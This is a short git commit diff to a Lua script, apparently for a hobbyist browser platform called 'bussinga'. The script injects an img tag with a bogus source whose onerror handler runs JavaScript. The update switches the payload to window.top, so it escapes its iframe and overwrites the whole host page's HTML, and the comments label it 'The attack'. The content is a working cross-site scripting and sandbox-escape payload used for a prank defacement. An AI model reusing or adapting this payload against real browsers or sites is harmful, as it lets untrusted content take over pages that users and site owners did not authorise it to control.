133549408d69e7c506f01fa4a65d29980c15642c
inventionpro <109528211+inventionpro@users.noreply.github.com>
2025-04-13 12:15:05 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,3 +1,8 @@
-if window.browser == 'bussinga' then
-  get('l').set_content('<img src="x" onerror="window.parent.window.document.body.innerHTML=`<p>men kissing</p>`">')
+if window ~= nil then
+  if window.browser == 'bussinga' then
+    -- The attack
+    -- Since the image has an invalid source, onerror will run
+    -- window.top escpaces the iframe and then sets the body to a good messgae :3
+    get('l').set_content('<img src="x" onerror="window.top.document.querySelector(`html`).innerHTML=`<p>men kissing</p>`">')
+  end
 end
